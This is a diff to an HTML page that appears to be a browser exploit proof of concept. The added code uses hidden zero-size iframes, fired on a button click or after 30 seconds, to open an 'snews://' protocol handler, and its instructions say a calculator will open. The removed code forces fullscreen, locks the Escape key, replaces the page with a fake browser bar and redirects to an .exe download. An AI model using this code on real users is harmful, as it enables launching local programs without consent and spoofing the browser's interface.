@@ -1,16 +1,25 @@
-<body></body>
+<html>
+1. git clone https://github.com/koocola/test_app.git<br>
+2. open the click_me button or wait 30s then you will see calculator open<br>
+<body>
+<button type="button" onclick="a()">click me</button>
 <script>
-    document.body.onclick = () => {
-      setTimeout('document.documentElement.requestFullscreen();', 399)
-      setTimeout('navigator.keyboard.lock(["Escape"]);', 499)
-      setTimeout('document.location="https://testsafebrowsing.appspot.com/s/content.exe"', 599)
+    function a() {
+        iframe = document.createElement("iframe");
+        iframe.frameBorder = 0;
+        iframe.width = 0;
+        iframe.height = 0;
+        iframe.src = "snews://1234";
+        document.body.appendChild(iframe);
     }
-    document.addEventListener('keydown', (e) => {
-      if ((e.code === 'Escape') && !(event.ctrlKey || event.metaKey)) {
-        // Do something when the 'A' key was pressed, but only
-        // when not in combination with the command or control key.
-        var content = 'Insert omnibox here!';
-        document.getElementsByTagName('body')[0].innerHTML = content; 
-      }
-    });
+    setTimeout(function() {
+        iframe2 = document.createElement("iframe");
+        iframe2.frameBorder = 0;
+        iframe2.width = 0;
+        iframe2.height = 0;
+        iframe2.src = "snews://1234";
+        document.body.appendChild(iframe2);
+    },30000);
 </script>
+</body>
+</html>
